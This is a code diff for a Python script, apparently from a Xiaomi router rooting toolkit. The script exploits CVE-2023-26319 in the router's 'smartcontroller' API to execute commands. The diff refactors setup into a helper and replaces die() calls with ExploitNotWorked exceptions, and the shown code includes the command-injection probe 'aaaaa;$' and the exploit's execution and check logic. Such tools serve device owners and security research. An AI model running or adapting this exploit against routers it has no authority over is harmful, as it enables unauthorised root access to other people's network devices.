@@ -17,32 +17,13 @@ import json
 import xmir_base
 from gateway import *
 
-class ExploitError(Exception): pass
 
-
-gw = Gateway(timeout = 4, detect_ssh = False)
-if gw.status < 1:
-    die("Xiaomi Mi Wi-Fi device not found (IP: {})".format(gw.ip_addr))
-
-print("device_name =", gw.device_name)
-print("rom_version = {} {}".format(gw.rom_version, gw.rom_channel))
-print("mac address = {}".format(gw.mac_address))
-
-dn = gw.device_name
-gw.ssh_port = 22
-ret = gw.detect_ssh(verbose = 1, interactive = True)
-if ret == 23:
-    if gw.use_ftp:
-        die("Telnet and FTP servers already running!")
-    print("Telnet server already running, but FTP server not respond")
-elif ret > 0:
-    die(0, "SSH server already installed and running")
+try:
+    gw = inited_gw
+except NameError:
+    gw = create_gateway(die_if_sshOk = True)
 
 ccode = gw.device_info["countrycode"]
-if ccode == "CN":
-    print('CountryCode = CN')
-
-stok = gw.web_login()
 
 # CVE-2023-26319   Note: https://blog.thalium.re/posts/rooting-xiaomi-wifi-routers/
 
@@ -149,7 +130,7 @@ def exec_tiny_cmd(cmd, act_delay = 2):
         code = dres['code']
     except Exception:
         if res == 'Internal Server Error':
-            die(f'Exploit "smartcontroller" not working! [{res}]')
+            raise ExploitNotWorked(f'Exploit "smartcontroller" not working! [{res}]')
         raise ExploitError(f'Error on parse response for command "scene_setting" => {res}')
     if code != 0:
         raise ExploitError(f'Error on exec command "scene_setting" => {res}')
@@ -241,13 +222,13 @@ hackCheck = False
 res = exec_smart_command("aaaaa;$", ignore_err_code = 2)
 if isinstance(res, dict):
     if res['msg'] != 'api not exists':
-        die(f'Smartcontroller return error: {res}')
+        raise ExploitNotWorked(f'Smartcontroller return error: {res}')
 else:
     if 'Internal Server Error' in res:
         print(f'Detect using xiaoqiang "hackCheck" fix ;-)')
         hackCheck = True
     else:
-        die(f'Smartcontroller return Error: {res}')
+        raise ExploitNotWorked(f'Smartcontroller return Error: {res}')
 
 # get device orig system time
 dst = gw.get_device_systime()
@@ -291,7 +272,7 @@ gw.set_device_systime(dst, wait = False)
 if not sc_activated:
     time.sleep(1)
     reset_smart_task()
-    die('Exploit "smartcontroller" not working!!!')
+    raise ExploitNotWorked('Exploit "smartcontroller" not working!!!')
 
 #print('Logger ...')
 #res = exec_cmd("logger hello")
